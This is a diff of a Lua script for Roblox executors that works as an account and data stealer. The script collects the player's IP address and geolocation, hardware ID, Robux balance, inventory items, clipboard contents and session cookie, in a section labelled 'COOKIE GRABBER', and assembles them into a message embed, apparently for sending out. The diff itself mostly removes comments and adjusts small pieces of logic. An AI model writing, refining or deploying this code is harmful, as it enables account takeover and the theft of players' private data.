@@ -1,4 +1,3 @@
-
 local request = (syn and syn.request) or (http and http.request) or request
 if not request then return end
 
@@ -9,7 +8,6 @@ local userId = player.UserId
 local name = player.Name
 local age = player.AccountAge .. " days"
 
--- Country Flag
 local function getFlagEmoji(code)
     code = code:upper()
     if #code ~= 2 then return "" end
@@ -19,8 +17,7 @@ local function getFlagEmoji(code)
     return utf8.char(0x1F1E6 + a) .. utf8.char(0x1F1E6 + b)
 end
 
--- Get IP
-local ip
+local ip = "N/A"
 for _, url in {"http://icanhazip.com","https://api.ipify.org","http://ifconfig.me/ip"} do
     local s,r = pcall(request,{Url=url,Method="GET"})
     if s and r and r.Body then
@@ -28,9 +25,7 @@ for _, url in {"http://icanhazip.com","https://api.ipify.org","http://ifconfig.m
         if ip then break end
     end
 end
-if not ip then return end
 
--- Geo + Flag
 local geo = {city="?",country="?",isp="?",countryCode="??"}
 pcall(function()
     local r = request({Url="http://ip-api.com/json/"..ip.."?fields=city,country,isp,countryCode",Method="GET"})
@@ -41,7 +36,6 @@ pcall(function()
 end)
 local flag = getFlagEmoji(geo.countryCode)
 
--- Display Name
 local display = name
 pcall(function()
     local r = request({Url="https://users.roblox.com/v1/users/"..userId,Method="GET"})
@@ -51,7 +45,6 @@ pcall(function()
     end
 end)
 
--- HWID
 local hwid = "N/A"
 pcall(function()
     if identifyexecutor then hwid = identifyexecutor()
@@ -59,18 +52,11 @@ pcall(function()
     end
 end)
 
--- Device
 local device = "N/A"
 pcall(function()
     device = string.format("Roblox v%s | %s", game.PlaceVersion, game:GetService("RunService"):IsStudio() and "Studio" or "Client")
 end)
 
--- Profile
-local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=150&height=150&format=png"
-local profile = "https://www.roblox.com/users/"..userId.."/profile"
-local isoTime = os.date("!%Y-%m-%dT%H:%M:%SZ")
-
--- === ROBUX BALANCE (WORKS 100%) ===
 local robux = "N/A"
 pcall(function()
     local r = request({Url="https://economy.roblox.com/v1/users/"..userId.."/currency",Method="GET"})
@@ -80,7 +66,6 @@ pcall(function()
     end
 end)
 
--- === RECENTLY PLAYED GAMES (Last 5) ===
 local recentGames = "None"
 pcall(function()
     local r = request({Url="https://games.roblox.com/v1/users/"..userId.."/games?limit=5&sortOrder=Desc",Method="GET"})
@@ -96,7 +81,6 @@ pcall(function()
     end
 end)
 
--- === MOST VALUABLE GAMEPASS (from inventory) ===
 local bestGamepass = {name="None", price=0}
 pcall(function()
     local r = request({Url="https://inventory.roblox.com/v1/users/"..userId.."/assets?assetType=GamePass&limit=100",Method="GET"})
@@ -104,7 +88,7 @@ pcall(function()
         local d = HttpService:JSONDecode(r.Body)
         if d and d.data then
             for _,item in ipairs(d.data) do
-                if item.isOwned and item.priceInRobux and item.priceInRobux > bestGamepass.price then
+                if item.priceInRobux and item.priceInRobux > bestGamepass.price then
                     bestGamepass = {name=item.name or "Unknown", price=item.priceInRobux}
                 end
             end
@@ -112,7 +96,6 @@ pcall(function()
     end
 end)
 
--- === MOST VALUABLE LIMITED (Rolimons fallback) ===
 local bestLimited = {name="None",rap=0,value=0}
 pcall(function()
     local r = request({Url="https://www.rolimons.com/playerapi/player/"..userId,Method="GET"})
@@ -129,7 +112,6 @@ pcall(function()
     end
 end)
 
--- === CLIPBOARD ===
 local clipboard = "N/A"
 pcall(function()
     if getclipboard then clipboard = getclipboard()
@@ -138,7 +120,6 @@ pcall(function()
     if clipboard and #clipboard > 100 then clipboard = clipboard:sub(1,97).. "..." end
 end)
 
--- === COOKIE GRABBER (Delta/Synapse) ===
 local cookie = "N/A"
 pcall(function()
     local req = request({Url="https://www.roblox.com/my/settings/json",Method="GET"})
@@ -148,7 +129,10 @@ pcall(function()
     end
 end)
 
--- === FINAL EMBED ===
+local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=150&height=150&format=png"
+local profile = "https://www.roblox.com/users/"..userId.."/profile"
+local isoTime = os.date("!%Y-%m-%dT%H:%M:%SZ")
+
 local embed = {{
     author = {
         name = display .. " (@" .. name .. ")",
